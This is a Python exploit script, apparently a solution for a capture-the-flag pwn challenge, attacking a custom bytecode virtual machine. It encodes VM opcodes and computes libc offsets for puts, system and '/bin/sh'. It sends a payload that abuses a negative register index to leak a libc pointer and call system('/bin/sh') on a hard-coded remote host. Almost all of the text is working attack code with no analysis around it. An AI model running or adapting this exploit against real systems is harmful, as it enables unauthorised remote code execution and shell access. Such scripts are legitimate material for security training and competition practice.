from xidp import *

#---------------------初始化----------------------------
arch = 64
elf_os = 'linux'

challenge = "./pwn2"
libc_path = './libc.so.6'
ip = '101.200.155.151:20000'
# 1-远程 其他-本地
link = 2
io, elf, libc = loadfile(challenge, libc_path, ip, arch, elf_os, link)

debug(0)            # 其他-debug   1-info
# context.terminal = ['tmux', 'splitw', '-h']
#---------------------初始化-----------------------------

#---------------------debug------------------------------
# 自定义cmd
cmd = """
    set follow-fork-mode parent 
    x/60gx $rebase(0x4000) 
    heap 
    """ 
# 断点
bps = [0x014FF]
#---------------------debug-------------------------------

def mov_imm(reg, imm):
    """操作码 0x00: 将 8 字节立即数存入寄存器""" 
    """0x00, reg_idx, <8B立即数>""" 
    return flat(p8(0), p8(reg, signed=True), p64(imm, signed=True))   

def load_ptr_reg(ptr_reg_addr, target_reg):
    """操作码 0x01: 寄存器间接加载 (src -> dst)""" 
    """0x01, target_reg = *ptr_reg_addr""" 
    return flat( 
            p8(1), 
            p8(ptr_reg_addr, signed=True),  # 允许为负数 
            p8(target_reg, signed=True) 
            ) 

def store_ptr_reg(reg, target_reg):
    """操作码 0x02: 寄存器间接存储 (src -> [dst])""" 
    """0x02, *target_reg = reg""" 
    return flat(p8(2), p8(reg), p8(target_reg))  # <bb + b → p8+p8+p8 

def mov_reg1_reg2(reg1, reg2):
    """操作码 0x03: 寄存器间移动 (src -> dst)""" 
    """0x03, reg2 = reg1""" 
    return flat(p8(3), p8(reg1), p8(reg2))  # <bb + b → p8+p8+p8 

def push(reg_idx):
    """操作码 0x04: 压栈""" 
    """0x04, push reg; stack_rbp-0x8""" 
    return flat(p8(4), p8(reg_idx))  # <bB → p8+p8 

def pop(reg_idx):
    """操作码 0x05: 出栈""" 
    """0x05, pop reg stack_rbp+0x8""" 
    return flat(p8(5), p8(reg_idx))  # <bB → p8+p8 

def call(reg_idx):
    """操作码 0x06: 调用寄存器指向的函数""" 
    """call reg""" 
    return flat(p8(6), p8(reg_idx))  # <bB → p8+p8 

def jmp_reg(reg_idx):
    """操作码 0x07: 跳转寄存器指向的地址""" 
    """0x07, jmp reg 但是对跳转的范围有限制，所以我们不使用他""" 
    return flat(p8(7), p8(reg_idx))  # <bB → p8+p8 

def vm_exit():
    """操作码 0x08: 虚拟机退出""" 
    return p8(8)  # b → p8 

def add(reg, imm):
    """操作码 0x0A: 寄存器加立即数""" 
    return flat(p8(0xA), p8(reg), p64(imm))  # <bbQ → p8+p8+p64 

def sub(reg, imm):
    """操作码 0x0B: 寄存器减立即数""" 
    return flat(p8(0xB), p8(reg), p64(imm))  # <bbQ → p8+p8+p64 

puts_offset = libc.sym['puts']
system_offset = puts_offset- libc.sym['system']
bin_sh_offset = next(libc.search(b'/bin/sh')) - puts_offset

leak("puts_offset")
leak("system_offset")
leak("bin_sh_offset")

# VM_list = 0x04060

pwndbg(1, bps, cmd)

payload = load_ptr_reg(-11, 1)
payload += sub(1, 0x78)
payload += load_ptr_reg(1, 0)
payload += load_ptr_reg(1, 2)
payload += add(0, bin_sh_offset)
payload += sub(4, system_offset)
payload += call(4)

put(payload)

sda("Enter bytecode: ", payload)

ia()
